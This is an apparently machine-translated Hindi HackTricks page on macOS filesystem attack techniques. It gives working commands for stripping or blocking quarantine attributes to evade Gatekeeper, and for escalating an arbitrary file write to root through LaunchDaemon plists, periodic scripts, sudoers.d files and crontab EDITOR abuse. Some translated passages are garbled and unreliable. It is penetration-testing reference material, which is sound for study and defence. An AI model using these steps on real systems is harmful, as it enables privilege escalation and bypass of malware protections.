# macOS FS ट्रिक्स

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) को PR जमा करके।

</details>

## POSIX अनुमतियाँ कम्बिनेशन

**डायरेक्टरी** में अनुमतियाँ:

* **पढ़ना** - आप डायरेक्टरी प्रविष्टियों को **गणना** कर सकते हैं
* **लिखना** - आप डायरेक्टरी में फ़ाइलें **हटा सकते/लिख सकते** हैं
* **चलाना** - आपको डायरेक्टरी को **तर्वण** करने की अनुमति है - यदि आपके पास यह अधिकार नहीं है, तो आप उसमें कोई भी फ़ाइल या उप-डायरेक्टरी तक पहुंच नहीं पा सकते हैं।

### खतरनाक कम्बिनेशन

**कैसे एक फ़ाइल/फ़ोल्डर को ओवरराइट करें**, लेकिन:

* पथ में एक माता-पिता **डायरेक्टरी मालिक** उपयोगकर्ता है
* पथ में एक माता-पिता **डायरेक्टरी मालिक** उपयोगकर्ता समूह है जिसके **लिखने का अधिकार** है
* एक उपयोगकर्ता समूह को **फ़ाइल** में **लिखने** की अनुमति है

पिछले किसी भी कम्बिनेशन के साथ, एक हमलावर्धक एक उच्चाधिकारिता अनुकरणीय लिखने प्राप्त करने के लिए एक **सिम/हार्ड लिंक** को अपेक्षित पथ में **इंजेक्ट** कर सकता है।

### फ़ोल्डर रूट R+X विशेष मामला

यदि किसी **डायरेक्टरी** में फ़ाइलें हैं जहां **केवल रूट को R+X पहुंच** है, तो वे **किसी और के लिए अनुपयोगी होती हैं**। इसलिए, यदि किसी विकर्षण को अनुमति देने वाली एक दुर्बलता होती है जो एक उपयोगकर्ता द्वारा पढ़ी जा सकती है, जो उस **प्रतिबंध** के कारण पढ़ा नहीं जा सकती है, इस फ़ोल्डर से एक अलग फ़ोल्डर में एक फ़ाइल को ले जाने के लिए उपयोग किया जा सकता है।

उदाहरण: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## प्रतीकात्मक लिंक / हार्ड लिंक

यदि एक उच्चाधिकारिता प्रक्रिया एक **फ़ाइल** में डेटा लिख रही है जो एक **निम्नाधिकारिता उपयोगकर्ता** द्वारा **नियंत्रित** किया जा सकता है, या जो पहले से ही एक निम्नाधिकारिता उपयोगकर्ता द्वारा **बनाई गई** हो सकती है। उपयोगकर्ता बस एक प्रतीकात्मक या हार्ड लिंक के माध्यम से इसे दूसरी फ़ाइल पर **पॉइंट** कर सकता है, और उच्चाधिकारिता प्रक्रिया उस फ़ाइल पर लिखेगी।

हमलावर्धक एक अनुकरणीय लिखने को उच्चाधिकारिता बनाने के लिए हमलावर्धक कहां उपयोग कर सकता है, इसकी जांच करें।

## अनियमित FD

यदि आप किसी **प्रक्रिया को एक उच्चाधिकारिता फ़ाइल या फ़ोल्डर खोलने** के लिए मजबूर कर सकते हैं, तो आप **`crontab`** का दुरुपयोग कर सकते हैं ताकि `/etc/sudoers.d` में एक फ़ाइल को **`EDITOR=exploit.py`** के साथ खोलें, इसलिए `exploit.py` `/etc/sudoers` के अंदर फ़ाइल के लिए FD प्राप्त करेगा और इसे दुरुपयोग करेगा।

उदाहरण: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## क्वारंटाइन xattrs ट्रिक्स से बचें

### इसे हटाएँ
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable फ्लैग

यदि किसी फ़ाइल / फ़ोल्डर में यह अविचलनीय गुण होता है, तो उस पर xattr नहीं लगाया जा सकता है।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs माउंट

**devfs** माउंट **xattr का समर्थन नहीं करता**, अधिक जानकारी [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) में।
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### लिखेंएक्सट्रेक्ट्रेस एसीएल

यह एसीएल फ़ाइल में `xattrs` को जोड़ने से रोकता है।
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल की ACEs के साथ एक फ़ाइल की प्रतिलिपि बनाता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि **`com.apple.acl.text`** नामक xattr में संग्रहीत ACL पाठ प्रतिष्ठान फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक ऐप्लिकेशन को एक zip फ़ाइल में AppleDouble फ़ाइल प्रारूप के साथ संपीड़ित किया है जिसमें एक ACL है जो अन्य xattr को इसमें लिखने से रोकता है... तो quarantine xattr ऐप्लिकेशन में सेट नहीं हुआ था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) की जांच करें।

इसे पुनर्निर्मित करने के लिए हमें पहले सही acl स्ट्रिंग प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

वास्तव में आवश्यक नहीं है लेकिन मैं इसे वहां छोड़ देता हूं बस इसके लिए:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## कोड साइनेचर को छोड़ें

बंडल में फ़ाइल **`_CodeSignature/CodeResources`** होती है जिसमें बंडल में हर एक **फ़ाइल** का **हैश** होता है। ध्यान दें कि CodeResources का हैश भी **executable में समाहित** होता है, इसलिए हम उसके साथ छेड़छाड़ नहीं कर सकते।

हालांकि, कुछ ऐसी फ़ाइलें हैं जिनके साइनेचर की जांच नहीं की जाएगी, इनमें plist में छोड़ दिया गया कुंजी होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
यह संभव है कि आप CLI से संसाधन के हस्ताक्षर की गणना कर सकते हैं:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## डीएमजी माउंट करें

एक उपयोगकर्ता एक कस्टम डीएमजी बना सकता है जो मौजूदा कुछ मौजूदा फ़ोल्डरों के ऊपर भी बना सकता है। यहां आप कस्टम सामग्री के साथ एक कस्टम डीएमजी पैकेज कैसे बना सकते हैं:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## अनियमित लेखन

### नियमित एसएच स्क्रिप्ट

यदि आपका स्क्रिप्ट एक **शेल स्क्रिप्ट** के रूप में व्याख्या किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** शेल स्क्रिप्ट को अधिलेखित कर सकते हैं जो प्रतिदिन ट्रिगर होगा।

आप इस स्क्रिप्ट की **जाली** निष्पादन कर सकते हैं: **`sudo periodic daily`**

### डेमन

एक अनियमित **लॉन्चडेमन** जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** को लिखें, जिसमें एक प्लिस्ट द्वारा एक अनियमित स्क्रिप्ट का निष्पादन किया जाता है, जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
आपको रूट के रूप में चलाने के लिए चाहिए वाले **कमांड** के साथ `/Applications/Scripts/privesc.sh` स्क्रिप्ट उत्पन्न करें।

### Sudoers फ़ाइल

यदि आपके पास **अनियमित लेखन** है, तो आप `/etc/sudoers.d/` फ़ोल्डर के अंदर एक फ़ाइल बना सकते हैं जिससे आपको **sudo** अधिकार प्राप्त होंगे।

## संदर्भ

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहेंगे? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)।

</details>
